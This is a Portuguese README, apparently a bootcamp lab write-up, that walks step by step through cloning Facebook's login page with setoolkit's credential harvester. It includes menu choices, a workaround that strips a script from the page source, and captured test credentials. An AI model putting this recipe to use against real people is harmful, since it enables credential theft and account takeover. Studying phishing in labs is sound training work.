# Phishing para a captura de credenciais do Facebook

Este é um desafio proposto pela DIO no Santander Bootcamp Cibersegurança #2.

## Ferramentas
- Kali Linux
- setoolkit

## Configurando o Phishing no Kali Linux
- Acesso root: `sudo su`
- Iniciando o setoolkit: `setoolkit`
- Tipo de ataque **Social-Engineering Attacks**: `1`
- Vetor de ataque **Website Attack Vectors**: `2`
- Método de ataque **Credential Harvester Attack Method**: `3`

A partir deste ponto, usar a opção **Site Cloner** para coletar as credenciais do facebook não é suficiente, devido as medidas de segurança do site. Para contornar este problema, utilizei o [método sugerido pelo Weslley Costa](https://github.com/cassiano-dio/cibersecurity-desafio-phishing), que consiste em usar a opção **Custom Import** do _setoolkit_.

- Método de ataque: **Custom Import**: 3
- Em seguida, o _setoolkit_ vai pedir para inserir o IP em que será hospedado a página phishing. Apenas pressione ENTER para usar o IP da máquina. Para conferir o IP manualmente, execute o comando `ifconfig`.

### Configurando a página phishing
- Crie um arquivo chamado `index.html`
- Acesse https://www.facebook.com no seu navegador
- Clique com o botão direito e clique em **View Page Source**
- Copie o código fonte da página e cole no arquivo `index.html` criado
- Abra o arquivo e identifique e delete a linha que contém:
    
    `<script src="https://static.xx.fbcdn.net/rsrc.php/v4/yh/r/eu52kbGWc19.js" data-bootloader-hash="lp6Cw4s" crossorigin="anonymous"></script>`
    
    Lembre-se de salvar o arquivo.

### Finalizando a configuração no setoolkit
- Voltando ao _setoolkit_, insira o caminho do diretório que contém o arquivo `index.html`
- Selecione a opção **Copy the entire folder**: `2`
- Por fim, insira a URL do site importado. Neste caso: `http://www.facebook.com`

## Resultados

Após inserir as credenciais no site phishing acessado através do IP fornecido no _setoolkit_, os dados são coletados e mostrados no programa:
```
192.168.100.101 - - [14/Dec/2024 14:46:17] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: jazoest=21044            
PARAM: lsd=AVpj4siniQk                                                             
POSSIBLE USERNAME FIELD FOUND: email=testando@gmail.com                                            
POSSIBLE PASSWORD FIELD FOUND: pass=testando12345                                                  
POSSIBLE USERNAME FIELD FOUND: login_source=comet_headerless_login                                 
PARAM: next=          
POSSIBLE USERNAME FIELD FOUND: login=1                                                             
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT. 
```
